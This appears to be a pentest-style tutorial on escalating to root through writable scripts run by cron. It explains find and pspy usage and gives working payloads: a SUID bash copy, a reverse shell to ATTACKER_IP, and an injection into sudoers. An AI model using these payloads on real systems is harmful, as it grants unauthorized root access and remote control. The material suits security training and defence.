## 1. Finding World-Writable Files

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### What This Does

- `-path /proc -prune` → Skips `/proc` directory
- `-type f` → Looks for regular files
- `-perm -o+w` → Finds files writable by others
- `2>/dev/null` → Suppresses permission denied errors
### Why This Matters

If a cron job executes a script that is **world-writable**, we can modify that script and inject malicious commands.  
When cron runs it as root, our payload executes as root.

That is the core abuse case.

---
## 2. Confirming Cron Execution with pspy

`pspy` is a great tool because it does not require root privileges and monitors processes via `/proc`.

Run:

```bash
./pspy64 -pf -i 1000
```

### Flags Explained

- `-p` → Print processes
- `-f` → Print file system events
- `-i 1000` → Scan `/proc` every 1000ms (1 second)
---
## What You’re Looking For

When running `pspy`, watch for:

- `/usr/sbin/cron`
- `/bin/sh -c <script>`
- Any custom scripts running on intervals
- Scripts inside `/etc/cron.*`
- Anything executed as **root**

Example output:

```
CMD: UID=0    PID=1234   | /bin/sh /home/user/backup.sh
```

If `/home/user/backup.sh` is writable by you, that’s your entry point.

---
## 3. Cron Job Abuse Scenario

### Step 1 – Identify Writable Script

```bash
ls -la /path/to/script.sh
```

If writable:

```
-rwxrwxrwx 1 root root  1234 backup.sh
```

That’s vulnerable.

---
### Step 2 – Inject Payload

Example payload:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> backup.sh
```

When cron runs:

```bash
/tmp/rootbash -p
```

You now have a root shell.

---
## Alternative Payloads

Reverse shell:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Or add yourself to sudoers:

```bash
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

Be careful. Breaking sudoers syntax bricks sudo.

---
## Common Cron Locations to Check

- `/etc/crontab`
- `/etc/cron.d/`
- `/etc/cron.daily/`
- `/etc/cron.hourly/`
- `/var/spool/cron/`
- User crontabs via:
```bash
crontab -l
```
---